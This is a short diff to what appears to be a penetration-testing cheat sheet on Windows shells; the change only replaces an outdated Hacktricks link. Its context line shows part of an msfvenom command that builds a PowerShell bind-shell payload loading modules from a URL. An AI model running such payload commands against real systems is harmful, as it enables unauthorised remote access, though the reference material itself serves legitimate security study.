@@ -65,7 +65,7 @@ $ msfvenom -p windows/x64/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]
 
 ### Hacktricks
 
-- [Hacktricks: Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)
+- [Hacktricks: Shell Windows](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html)
 
 ### Ironhackers
 
